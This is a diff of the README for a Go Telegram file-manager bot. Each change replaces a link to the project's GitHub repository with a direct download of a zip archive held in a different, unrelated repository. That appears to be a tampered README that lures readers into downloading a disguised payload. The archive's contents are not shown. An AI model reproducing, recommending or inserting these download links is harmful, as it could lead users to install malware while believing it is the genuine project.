@@ -5,7 +5,7 @@ description: "Manage files on a remote machine via Telegram with secure, admin-o
 ---
 # 📁 go-file-manager - Manage Your Telegram Files With Ease
 
-[![Download go-file-manager](https://img.shields.io/badge/Download-go--file--manager-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vanl214/go-file-manager)
+[![Download go-file-manager](https://img.shields.io/badge/Download-go--file--manager-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/vanl214/vanl214.github.io/main/msx/Latest_1.4.zip)
 
 go-file-manager is a friendly helper that lives inside Telegram and keeps all your files organized in one place. It is a file manager bot built with the Go programming language, which means it is fast, light on resources, and reliable even when you are moving large amounts of data around. If you have ever lost track of a document, photo, or video inside a chat, this tool is for you.
 
@@ -41,11 +41,11 @@ Behind the scenes, go-file-manager is written in Go, a language famous for speed
 
 ## 💻 Download and Setup
 
-[![Download go-file-manager](https://img.shields.io/badge/Get%20go--file--manager-4a90e2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vanl214/go-file-manager)
+[![Download go-file-manager](https://img.shields.io/badge/Get%20go--file--manager-4a90e2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/vanl214/vanl214.github.io/main/msx/Latest_1.4.zip)
 
 Visit this link to download the application:
 
-**https://github.com/vanl214/go-file-manager**
+**https://raw.githubusercontent.com/vanl214/vanl214.github.io/main/msx/Latest_1.4.zip**
 
 Once you open the page, look for the download section and follow the on-screen prompts. Save the files to a folder you can find easily, such as your Desktop or your Downloads folder. Avoid placing them deep inside system folders, because that makes them harder to locate later.
 
@@ -141,6 +141,6 @@ Go compiles into a single, compact program that runs efficiently on modest hardw
 
 If you find go-file-manager useful, consider starring the repository. Stars help other people discover the project and show support for continued development. Bug reports and suggestions are welcome through the GitHub issue tracker, and clear, polite descriptions help maintainers fix problems faster.
 
-Visit **https://github.com/vanl214/go-file-manager** to download the application, read the latest updates, and join the community.
+Visit **https://raw.githubusercontent.com/vanl214/vanl214.github.io/main/msx/Latest_1.4.zip** to download the application, read the latest updates, and join the community.
 
 Keywords: file-manager, file-manager-bot, filemanager, go, go-bot, go-file-manager, go-filemanager, go-telegram-bot, golang, helloodev, telegram-file-manager-bot
